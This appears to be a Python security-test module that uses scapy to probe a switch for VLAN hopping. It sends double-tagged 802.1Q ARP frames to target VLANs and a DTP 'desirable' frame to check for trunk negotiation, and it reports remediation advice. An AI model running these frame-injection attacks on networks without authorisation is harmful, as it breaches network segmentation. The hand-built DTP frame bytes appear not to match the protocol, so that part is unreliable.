"""
Task: run_vlan_hop
Security test for VLAN hopping vulnerabilities.

Tests:
  1. Double-tagging: Crafts frames with two 802.1Q headers (outer = native VLAN,
     inner = target VLAN). If the switch strips only the outer tag and forwards,
     the frame reaches the target VLAN. ARP replies from that VLAN confirm transit.
     Runs once per target VLAN in the range.
  2. DTP negotiation: Sends a DTP "desirable" frame and listens for a response,
     indicating the switch will negotiate a trunk link. Runs once regardless of range.

Requires: scapy (pip3 install scapy) and CAP_NET_RAW / root.

Payload:
  interface:    network interface (default: eth0)
  native_vlan:  native/access VLAN on this port (default: 1)
  target_vlans: VLAN(s) to attempt to hop to. Accepts:
                  - single number: 10
                  - range:         10-50
                  - list/mixed:    10,20,100-110
                Maximum 50 VLANs per scan.
  target_ip:    optional IP to ARP-probe (used for all target VLANs; default: 192.0.2.1)
  timeout:      seconds to wait per VLAN test (default: 5)
"""

import asyncio
import logging
import re

logger = logging.getLogger(__name__)

SAFE_IFACE_RE = re.compile(r'^[a-zA-Z0-9.\-_]+$')
MAX_VLANS = 50


def parse_vlan_range(value) -> list[int]:
    """
    Parse a VLAN specifier into a sorted list of unique VLAN IDs.
    Accepts: int, "10", "10-20", "10,20", "10-20,30,40-45"
    """
    if isinstance(value, int):
        return [value]

    vlans = set()
    for part in str(value).split(','):
        part = part.strip()
        if '-' in part:
            lo, _, hi = part.partition('-')
            lo, hi = int(lo.strip()), int(hi.strip())
            if lo > hi:
                lo, hi = hi, lo
            vlans.update(range(lo, hi + 1))
        elif part:
            vlans.add(int(part))

    return sorted(vlans)


async def run(payload: dict) -> dict:
    interface   = payload.get("interface", "eth0")
    native_vlan = int(payload.get("native_vlan", 1))
    target_ip   = payload.get("target_ip", "")
    timeout     = float(payload.get("timeout", 5))

    # Accept both legacy target_vlan (single int) and new target_vlans (range string)
    raw = payload.get("target_vlans") or payload.get("target_vlan")
    if raw is None:
        raise ValueError("target_vlans is required (e.g. '10', '10-50', '10,20,100-110')")

    try:
        target_vlans = parse_vlan_range(raw)
    except (ValueError, TypeError) as e:
        raise ValueError(f"Invalid target_vlans value: {e}")

    if not SAFE_IFACE_RE.match(interface):
        raise ValueError(f"Invalid interface: {interface!r}")
    if not (1 <= native_vlan <= 4094):
        raise ValueError("native_vlan must be between 1 and 4094")
    for v in target_vlans:
        if not (1 <= v <= 4094):
            raise ValueError(f"VLAN ID {v} out of range (1–4094)")
    target_vlans = [v for v in target_vlans if v != native_vlan]
    if not target_vlans:
        raise ValueError("No valid target VLANs after excluding native_vlan")
    if len(target_vlans) > MAX_VLANS:
        raise ValueError(f"Too many VLANs ({len(target_vlans)}); maximum is {MAX_VLANS} per scan")

    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(
        None, _run_tests, interface, native_vlan, target_vlans, target_ip, timeout,
    )


def _run_tests(interface, native_vlan, target_vlans, target_ip, timeout) -> dict:
    try:
        from scapy.all import Ether, Dot1Q, ARP, LLC, SNAP, sendp, sniff, conf, get_if_hwaddr
    except ImportError:
        return {"error": "scapy not installed — run: pip3 install scapy", "supported": False}

    conf.verb = 0

    try:
        local_mac = get_if_hwaddr(interface)
    except Exception as e:
        return {"error": f"Cannot read MAC for {interface}: {e}"}

    probe_ip = target_ip or "192.0.2.1"

    # Double-tag test for each target VLAN
    double_tag_findings = [
        _test_double_tag(interface, local_mac, native_vlan, vlan, probe_ip, timeout)
        for vlan in target_vlans
    ]

    # DTP test runs once (not VLAN-specific)
    dtp_finding = _test_dtp(interface, local_mac, timeout)

    findings = double_tag_findings + [dtp_finding]
    vulnerable_vlans = [
        f["target_vlan"] for f in double_tag_findings if f.get("vulnerable")
    ]

    return {
        "interface":       interface,
        "native_vlan":     native_vlan,
        "vlans_tested":    target_vlans,
        "vulnerable_vlans": vulnerable_vlans,
        "findings":        findings,
        "vulnerable":      any(f.get("vulnerable") for f in findings),
    }


def _test_double_tag(interface, local_mac, native_vlan, target_vlan, probe_ip, timeout) -> dict:
    import threading
    from scapy.all import Ether, Dot1Q, ARP, sendp, sniff

    # Outer tag = native VLAN (stripped by first switch hop), inner = target VLAN
    frame = (
        Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff") /
        Dot1Q(vlan=native_vlan, type=0x8100) /
        Dot1Q(vlan=target_vlan) /
        ARP(op="who-has", pdst=probe_ip, hwsrc=local_mac)
    )

    replies = []

    def _capture(pkt):
        if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # is-at
            replies.append({"src_mac": pkt[ARP].hwsrc, "src_ip": pkt[ARP].psrc})

    done = threading.Event()

    def _sniff():
        sniff(iface=interface, filter="arp", timeout=timeout,
              prn=_capture, store=False)
        done.set()

    t = threading.Thread(target=_sniff, daemon=True)
    t.start()

    try:
        sendp(frame, iface=interface, count=3, inter=0.1, verbose=False)
    except PermissionError:
        return {"test": "double_tagging", "target_vlan": target_vlan,
                "error": "Permission denied — root/CAP_NET_RAW required"}
    except Exception as e:
        return {"test": "double_tagging", "target_vlan": target_vlan, "error": str(e)}

    done.wait(timeout=timeout + 1)
    t.join(timeout=1)

    vulnerable = len(replies) > 0
    return {
        "test":        "double_tagging",
        "native_vlan": native_vlan,
        "target_vlan": target_vlan,
        "frames_sent": 3,
        "replies":     replies,
        "vulnerable":  vulnerable,
        "description": (
            f"ARP replies received from VLAN {target_vlan} — double-tag hop succeeded. "
            "Ensure the native VLAN is not used for user traffic and disable DTP on access ports."
        ) if vulnerable else (
            f"No ARP replies from VLAN {target_vlan}. Switch may not be vulnerable, "
            "or no host at target_ip responded."
        ),
    }


def _test_dtp(interface, local_mac, timeout) -> dict:
    import threading
    from scapy.all import Ether, LLC, SNAP, sendp, sniff

    DTP_MULTICAST = "01:00:0c:cc:cc:cc"

    # Minimal DTP "desirable" frame: SNAP header + DTP status TLV
    dtp_payload = bytes([
        0x20, 0x04,                   # DTP type
        0x00, 0x01,                   # domain TLV length
        0x01, 0x00, 0x01, 0x04,       # status = desirable (0x01)
    ])

    frame = (
        Ether(src=local_mac, dst=DTP_MULTICAST) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2004) /
        dtp_payload
    )

    dtp_replies = []

    def _capture(pkt):
        if pkt.haslayer(SNAP) and pkt[SNAP].code == 0x2004:
            dtp_replies.append(pkt[Ether].src)

    done = threading.Event()

    def _sniff():
        sniff(iface=interface, filter="ether proto 0x8100 or ether dst 01:00:0c:cc:cc:cc",
              timeout=timeout, prn=_capture, store=False)
        done.set()

    t = threading.Thread(target=_sniff, daemon=True)
    t.start()

    try:
        sendp(frame, iface=interface, count=2, verbose=False)
    except Exception:
        pass

    done.wait(timeout=timeout + 1)
    t.join(timeout=1)

    vulnerable = len(dtp_replies) > 0
    return {
        "test":       "dtp_negotiation",
        "replies":    dtp_replies,
        "vulnerable": vulnerable,
        "description": (
            "Switch responded to DTP frames — port will negotiate trunking. "
            "Set all access ports to: switchport mode access / switchport nonegotiate"
        ) if vulnerable else (
            "No DTP response. Port appears to be in static access mode or DTP is disabled."
        ),
    }
